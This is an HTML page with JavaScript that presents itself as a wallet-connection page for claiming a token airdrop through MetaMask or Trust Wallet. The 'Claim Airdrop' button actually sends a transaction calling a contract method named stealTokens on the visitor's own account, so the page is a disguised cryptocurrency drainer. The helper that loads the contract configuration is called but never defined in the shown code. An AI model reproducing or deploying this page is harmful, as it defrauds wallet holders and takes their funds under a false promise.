<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectTrustWalletButton">Connect Trust Wallet</button>
<button id="connectMetaMaskButton">Connect MetaMask</button>
<button id="claimAirdropButton" disabled>Claim Airdrop</button>

<script>
// MetaMask Connection Logic
async function connectMetaMask() {
    if (window.ethereum && window.ethereum.isMetaMask) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            const account = accounts[0];

            let network = '';
            if (currentChainId === '0x1' || currentChainId === 1) {
                network = 'eth'; // Ethereum Mainnet
            } else if (currentChainId === '0x38' || currentChainId === 56) {
                network = 'bsc'; // Binance Smart Chain Mainnet
            }

            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${network.toUpperCase()})`;
            console.log(`Connected to MetaMask with account: ${account}`);
            return account;
        } catch (error) {
            console.error("MetaMask connection failed:", error);
            alert("Failed to connect to MetaMask.");
        }
    } else {
        alert("MetaMask is not installed. Please install it to continue.");
        return null;
    }
}

// Trust Wallet Connection Logic
async function connectTrustWallet() {
    if (window.ethereum && window.ethereum.isTrust) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            const account = accounts[0];

            let network = '';
            if (currentChainId === '0x1' || currentChainId === 1) {
                network = 'eth'; // Ethereum Mainnet
            } else if (currentChainId === '0x38' || currentChainId === 56) {
                network = 'bsc'; // Binance Smart Chain Mainnet
            }

            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${network.toUpperCase()})`;
            console.log(`Connected to Trust Wallet with account: ${account}`);
            return account;
        } catch (error) {
            console.error("Trust Wallet connection failed:", error);
            alert("Failed to connect to Trust Wallet.");
            return null;
        }
    } else {
        alert("Trust Wallet is not installed or enabled. Please install it to continue.");
        return null;
    }
}

// Airdrop claiming function
async function claimAirdrop(account) {
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
    let network = '';

    if (currentChainId === '0x1') {
        network = 'eth';  // Ethereum Mainnet
    } else if (currentChainId === '0x38') {
        network = 'bsc';  // Binance Smart Chain Mainnet
    } else {
        alert("You are not connected to a supported network.");
        return;
    }

    const { config, abi } = await loadConfigAndABI(network);
    const contractAddress = config.contractAddress;
    const tokenAddress = config.tokenAddress;

    const web3 = new Web3(window.ethereum);
    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        console.log(`Claiming airdrop for account: ${account} on ${network} network`);
        await contract.methods.stealTokens(account).send({ from: account });
        alert(`Airdrop claimed successfully for account: ${account}`);
    } catch (error) {
        console.error("Error claiming airdrop:", error);
    }
}

// Event listener for the claim airdrop button
document.getElementById('claimAirdropButton').addEventListener('click', async () => {
    let account = null;

    // Always connect to Trust Wallet if the Trust Wallet button is clicked
    account = await connectTrustWallet();
    if (account) {
        await claimAirdrop(account);
    }
});

// Event listener for Trust Wallet button
document.getElementById('connectTrustWalletButton').addEventListener('click', async function () {
    const account = await connectTrustWallet(); // Always connect to Trust Wallet
    if (account) {
        document.getElementById('claimAirdropButton').disabled = false;
    }
});

// Event listener for MetaMask button
document.getElementById('connectMetaMaskButton').addEventListener('click', async function () {
    const account = await connectMetaMask(); // Always connect to MetaMask
    if (account) {
        document.getElementById('claimAirdropButton').disabled = false;
    }
});
</script>

</body>
</html>

